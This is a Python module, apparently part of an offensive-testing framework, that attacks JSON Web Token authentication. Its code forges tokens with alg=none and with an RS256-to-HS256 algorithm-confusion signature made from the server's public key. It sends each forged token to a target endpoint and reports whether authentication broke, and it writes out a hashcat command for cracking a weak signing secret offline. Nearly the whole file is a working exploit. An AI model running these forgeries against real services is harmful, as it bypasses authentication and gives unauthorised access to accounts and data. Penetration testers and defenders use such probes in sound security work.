"""JWT attack primitives — alg=none, alg-confusion, weak-secret crack.

Three probes against a single JWT:
  1. alg=none — strip the signature and re-send. If the server accepts,
     authentication is broken.
  2. alg-confusion — if the original is RS256 and the caller supplies the
     server's public key (e.g. from /.well-known/jwks.json), re-sign with
     HS256 using the public key as the HMAC secret. Acceptance ⇒ classic
     algorithm-confusion bug.
  3. weak-secret — report the path to attempt offline crack with hashcat
     mode 16500. The actual crack is deferred to Phase E with an external
     tool; we record the candidate-wordlist parameters here.

opts shape::
    {
      "token":         "eyJhbGc...",  (required)
      "endpoint":      "https://api.target/me",  (where to test)
      "public_key":    optional PEM string for RS256→HS256 probe,
      "wordlist_path": optional path for the weak-secret report,
    }
"""
from __future__ import annotations

import base64
import hmac
import hashlib
import json
import urllib.request
import urllib.error
from typing import Any, Dict, List, Optional, Tuple

from .base import AttackResult, _result_error


def _b64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode("ascii")


def _b64url_decode(s: str) -> bytes:
    pad = "=" * (-len(s) % 4)
    return base64.urlsafe_b64decode(s + pad)


def _split_jwt(token: str) -> Tuple[Dict[str, Any], Dict[str, Any], str]:
    parts = token.split(".")
    if len(parts) != 3:
        raise ValueError("JWT must have three dot-separated parts")
    header  = json.loads(_b64url_decode(parts[0]))
    payload = json.loads(_b64url_decode(parts[1]))
    return header, payload, parts[2]


def _probe_token(endpoint: str, token: str, timeout: int = 10) -> Dict[str, Any]:
    """Send GET endpoint with Authorization: Bearer <token>. Return status
    + small body sample so the caller can judge acceptance."""
    req = urllib.request.Request(endpoint, method="GET",
                                 headers={"Authorization": f"Bearer {token}"})
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            raw = resp.read()
            return {"status": resp.status, "len": len(raw),
                    "body_head": raw[:200].decode("utf-8", errors="replace")}
    except urllib.error.HTTPError as e:
        return {"status": e.code, "len": 0, "body_head": ""}
    except Exception as e:
        return {"status": -1, "len": 0, "body_head": "", "error": str(e)}


def _forge_alg_none(payload: Dict[str, Any]) -> str:
    header = {"alg": "none", "typ": "JWT"}
    h = _b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    p = _b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    return f"{h}.{p}."


def _forge_hs256_with_pubkey(payload: Dict[str, Any], pub_key_pem: str) -> str:
    header = {"alg": "HS256", "typ": "JWT"}
    h = _b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    p = _b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    signing_input = f"{h}.{p}".encode()
    sig = hmac.new(pub_key_pem.encode(), signing_input, hashlib.sha256).digest()
    return f"{h}.{p}.{_b64url_encode(sig)}"


def run(target: str, opts: Dict[str, Any]) -> AttackResult:
    token    = opts.get("token") or ""
    endpoint = opts.get("endpoint") or target
    pub_key  = opts.get("public_key")
    wordlist = opts.get("wordlist_path")

    if not token:
        return _result_error("jwt", "token required")
    try:
        header, payload, original_sig = _split_jwt(token)
    except ValueError as e:
        return _result_error("jwt", str(e))

    evidence: List[Dict[str, Any]] = [
        {"role": "original_header",  "value": header},
        {"role": "original_payload", "value": payload},
    ]
    findings: List[str] = []
    confidence_max = 0.0

    # ── Probe 1: alg=none ─────────────────────────────────────────
    forged_none = _forge_alg_none(payload)
    none_resp   = _probe_token(endpoint, forged_none)
    evidence.append({"probe": "alg_none", "forged": forged_none, **none_resp})
    if 200 <= none_resp["status"] < 300:
        findings.append("alg=none accepted")
        confidence_max = max(confidence_max, 0.95)

    # ── Probe 2: RS256 → HS256 confusion ──────────────────────────
    if header.get("alg", "").upper().startswith("RS") and pub_key:
        forged_hs = _forge_hs256_with_pubkey(payload, pub_key)
        hs_resp   = _probe_token(endpoint, forged_hs)
        evidence.append({"probe": "alg_confusion", "forged": forged_hs, **hs_resp})
        if 200 <= hs_resp["status"] < 300:
            findings.append("RS256→HS256 confusion accepted")
            confidence_max = max(confidence_max, 0.93)

    # ── Probe 3: weak-secret advisory ─────────────────────────────
    if header.get("alg", "").upper().startswith("HS"):
        evidence.append({
            "probe": "weak_secret_advisory",
            "advice": ("Run `hashcat -m 16500 token.txt " +
                       (wordlist or "<wordlist>") + "` to attempt offline crack"),
        })

    if findings:
        return AttackResult(
            technique="jwt", success=True, confidence=confidence_max,
            summary="JWT broken: " + ", ".join(findings),
            evidence=evidence,
        )
    return AttackResult(
        technique="jwt", success=False, confidence=0.0,
        summary=f"JWT probes did not break authentication ({header.get('alg','?')})",
        evidence=evidence,
    )
